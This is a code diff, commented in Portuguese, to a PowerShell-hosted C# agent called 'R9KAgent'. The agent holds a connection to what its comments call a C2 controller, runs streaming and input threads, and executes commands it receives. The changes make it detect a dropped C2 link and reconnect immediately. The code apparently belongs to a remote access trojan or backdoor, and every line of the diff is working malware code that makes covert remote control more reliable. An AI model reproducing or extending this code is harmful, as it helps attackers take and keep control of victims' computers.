@@ -115,8 +115,16 @@ if (-not ("R9KAgent" -as [type])) {
                     Thread tStream = new Thread(StreamLoop); tStream.IsBackground = true; tStream.Start();
                     Thread tInput = new Thread(InputLoop); tInput.IsBackground = true; tInput.Start();
 
-                    while (client.Connected) Thread.Sleep(1000);
-                } catch { Thread.Sleep(3000); }
+                    // Loop de verificação para forçar a reconexão quando o controlador fecha
+                    while (client.Connected) {
+                        if (stream.Socket.Poll(1000, SelectMode.SelectRead) && stream.Socket.Available == 0) break;
+                        Thread.Sleep(100);
+                    }
+                } catch { 
+                    Thread.Sleep(3000); 
+                } finally {
+                    try { client.Close(); } catch {}
+                }
             }
         }
 
@@ -153,13 +161,14 @@ if (-not ("R9KAgent" -as [type])) {
 
         static void ReadLoop() {
             try {
-                while (client.Connected) {
-                    if (stream.DataAvailable) {
-                        string cmd = reader.ReadLine();
-                        if (cmd != null) ProcessCommand(cmd.Trim());
-                    } else { Thread.Sleep(5); }
+                while (true) {
+                    string cmd = reader.ReadLine();
+                    if (cmd == null) break; // Conexão fechada pelo C2
+                    ProcessCommand(cmd.Trim());
                 }
             } catch {}
+            // Força o loop principal a cair e tentar reconectar imediatamente
+            try { client.Close(); } catch {}
         }
 
         static void InputLoop() {
